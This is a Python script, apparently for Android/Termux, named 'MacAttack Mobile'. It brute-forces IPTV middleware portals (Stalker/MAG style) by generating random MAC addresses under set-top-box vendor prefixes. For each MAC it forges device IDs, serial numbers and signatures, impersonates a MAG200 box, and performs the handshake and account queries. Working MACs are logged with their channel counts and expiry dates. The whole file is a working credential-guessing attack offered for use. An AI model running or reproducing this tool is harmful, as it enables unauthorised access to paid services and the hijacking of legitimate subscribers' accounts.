#!/usr/bin/env python3
"""
MacAttack Mobile - Simplified version for Android/Termux
No GUI, no proxies, just the core MAC testing functionality
"""

import hashlib
import json
import random
import re
import requests
import sys
import time
from urllib.parse import urlparse

VERSION = "4.7.6-mobile"

def get_token(session, url, mac, timeout=30):
    """Get authentication token from the portal"""
    parsed_url = urlparse(url)
    parsed_path = parsed_url.path
    
    # Remove trailing 'c' or 'c/'
    if parsed_path.endswith("c"):
        parsed_path = parsed_path[:-1]
    if parsed_path.endswith("c/"):
        parsed_path = parsed_path[:-2]
    
    host = parsed_url.hostname
    port = parsed_url.port or 80
    base_url = f"http://{host}:{port}"
    
    headers = {
        "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
        "Accept-Encoding": "identity",
        "Accept": "*/*",
        "Connection": "keep-alive",
    }
    
    # Auto-detect portal type
    portal_type = None
    
    # Try portal.php
    version_url = f"{base_url}/c/version.js"
    try:
        response = requests.get(version_url, headers=headers, timeout=10)
        if response.status_code == 200:
            portal_type = "portal.php"
            print(f"✓ Detected portal type: Portal")
    except:
        pass
    
    # Try stalker_portal
    if not portal_type:
        version_url = f"{base_url}/stalker_portal/c/version.js"
        try:
            response = requests.get(version_url, headers=headers, timeout=10)
            if response.status_code == 200:
                portal_type = "stalker_portal/server/load.php"
                print(f"✓ Detected portal type: Stalker Portal")
        except:
            pass
    
    # Default to portal.php
    if not portal_type:
        portal_type = "portal.php"
        print(f"⚠ Using default portal type: Portal")
    
    # Construct base URL properly
    if parsed_path and not parsed_path.startswith('/'):
        parsed_path = '/' + parsed_path
    elif not parsed_path:
        parsed_path = '/'
    
    base_url = f"http://{host}:{port}{parsed_path}"
    
    # Remove duplicate stalker_portal
    if "stalker_portal/" in base_url and "stalker_portal/" in portal_type:
        base_url = base_url.replace("stalker_portal/", "")
    
    # Generate device IDs
    serialnumber = hashlib.md5(mac.encode()).hexdigest().upper()
    sn = serialnumber[0:13]
    device_id = hashlib.sha256(sn.encode()).hexdigest().upper()
    device_id2 = hashlib.sha256(mac.encode()).hexdigest().upper()
    hw_version_2 = hashlib.sha1(mac.encode()).hexdigest()
    
    cookies = {
        "adid": hw_version_2,
        "debug": "1",
        "device_id2": device_id2,
        "device_id": device_id,
        "hw_version": "1.7-BD-00",
        "mac": mac,
        "sn": sn,
        "stb_lang": "en",
        "timezone": "America/Los_Angeles",
    }
    
    handshake_url = f"{base_url}{portal_type}?action=handshake&type=stb&token=&JsHttpRequest=1-xml"
    
    try:
        response = session.get(handshake_url, cookies=cookies, headers=headers, timeout=timeout)
        response.raise_for_status()
        token = response.json().get("js", {}).get("token")
        
        if token:
            token_random = response.json().get("js", {}).get("random")
            return token, token_random, portal_type, base_url
        else:
            return None, None, None, None
    except Exception as e:
        print(f"✗ Error getting token: {e}")
        return None, None, None, None


def generate_random_mac(prefix="00:1A:79:"):
    """Generate a random MAC address"""
    return f"{prefix}{random.randint(0, 255):02X}:{random.randint(0, 255):02X}:{random.randint(0, 255):02X}"


def test_mac(session, base_url, portal_type, mac, token, token_random):
    """Test a single MAC address"""
    serialnumber = hashlib.md5(mac.encode()).hexdigest().upper()
    sn = serialnumber[0:13]
    device_id = hashlib.sha256(sn.encode()).hexdigest().upper()
    device_id2 = hashlib.sha256(mac.encode()).hexdigest().upper()
    hw_version_2 = hashlib.sha1(mac.encode()).hexdigest()
    snmac = f"{sn}{mac}"
    sig = hashlib.sha256(snmac.encode()).hexdigest().upper()
    
    session.cookies.update({
        "adid": hw_version_2,
        "debug": "1",
        "device_id2": device_id2,
        "device_id": device_id,
        "hw_version": "1.7-BD-00",
        "mac": mac,
        "sn": sn,
        "stb_lang": "en",
        "timezone": "America/Los_Angeles",
    })
    
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
        "Accept-Encoding": "identity",
        "Accept": "*/*",
        "Connection": "keep-alive",
        "Authorization": f"Bearer {token}",
    })
    
    if token_random:
        session.headers.update({"X-Random": f"{token_random}"})
        sig = hashlib.sha256(token_random.encode()).hexdigest().upper()
    
    try:
        # Get profile
        url = f"{base_url}{portal_type}?type=stb&action=get_profile&sn={sn}&device_id={device_id2}&device_id2={device_id2}&sig={sig}&JsHttpRequest=1-xml"
        response = session.get(url, timeout=10)
        
        if response.status_code != 200:
            return False, 0
        
        # Get main info
        url2 = f"{base_url}{portal_type}?type=account_info&action=get_main_info&JsHttpRequest=1-xml"
        res2 = session.get(url2, timeout=10)
        
        if res2.status_code != 200:
            return False, 0
        
        data = json.loads(res2.text)
        if "js" not in data or "mac" not in data["js"]:
            return False, 0
        
        # Get channels
        url3 = f"{base_url}{portal_type}?type=itv&action=get_all_channels&JsHttpRequest=1-xml"
        res3 = session.get(url3, timeout=10)
        
        if res3.status_code == 200:
            response_data = json.loads(res3.text)
            if isinstance(response_data, dict) and "js" in response_data and "data" in response_data["js"]:
                channels_data = response_data["js"]["data"]
                channel_count = len(channels_data)
                
                if channel_count > 0:
                    expiry = data["js"].get("phone", "Unknown")
                    return True, channel_count, expiry
        
        return False, 0
        
    except Exception as e:
        print(f"✗ Error testing MAC {mac}: {e}")
        return False, 0


def main():
    print("=" * 50)
    print(f"MacAttack Mobile v{VERSION}")
    print("Simplified version for Android/Termux")
    print("=" * 50)
    print()
    
    # Get IPTV URL
    iptv_url = input("Enter IPTV URL (e.g., http://example.com:8080/c/): ").strip()
    if not iptv_url:
        print("✗ No URL provided. Exiting.")
        return
    
    # Get MAC prefix
    print("\nAvailable prefixes:")
    print("1. 00:1A:79: (default)")
    print("2. 00:2A:01:")
    print("3. D4:CF:F9:")
    print("4. Custom")
    
    choice = input("\nSelect prefix (1-4) [1]: ").strip() or "1"
    
    if choice == "1":
        prefix = "00:1A:79:"
    elif choice == "2":
        prefix = "00:2A:01:"
    elif choice == "3":
        prefix = "D4:CF:F9:"
    elif choice == "4":
        prefix = input("Enter custom prefix (e.g., 00:1A:79:): ").strip()
    else:
        prefix = "00:1A:79:"
    
    print(f"\n✓ Using prefix: {prefix}")
    
    # Get number of MACs to test
    try:
        num_tests = int(input("\nHow many MACs to test? [1000]: ").strip() or "1000")
    except ValueError:
        num_tests = 1000
    
    print(f"\n{'=' * 50}")
    print("Starting MAC attack...")
    print(f"{'=' * 50}\n")
    
    session = requests.Session()
    hits = 0
    tested = 0
    
    # Test random MACs
    for i in range(num_tests):
        mac = generate_random_mac(prefix)
        tested += 1
        
        print(f"[{tested}/{num_tests}] Testing: {mac}... ", end="", flush=True)
        
        # Get token for this MAC
        token, token_random, portal_type, base_url = get_token(session, iptv_url, mac)
        
        if not token:
            print("✗ Failed to get token")
            continue
        
        # Test the MAC
        success, channel_count, *expiry_info = test_mac(session, base_url, portal_type, mac, token, token_random)
        
        if success:
            hits += 1
            expiry = expiry_info[0] if expiry_info else "Unknown"
            print(f"✓ HIT! Channels: {channel_count}, Expiry: {expiry}")
            
            # Save to file
            with open("MacAttackOutput_mobile.txt", "a") as f:
                f.write(f"\nPortal  : {iptv_url}\n")
                f.write(f"MAC Addr: {mac}\n")
                f.write(f"Channels: {channel_count}\n")
                f.write(f"Exp date: {expiry}\n")
                f.write("-" * 50 + "\n")
        else:
            print("✗")
        
        # Small delay to avoid rate limiting
        time.sleep(0.5)
    
    print(f"\n{'=' * 50}")
    print(f"Finished! Tested: {tested}, Hits: {hits}")
    print(f"Results saved to: MacAttackOutput_mobile.txt")
    print(f"{'=' * 50}")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n✗ Stopped by user")
        sys.exit(0)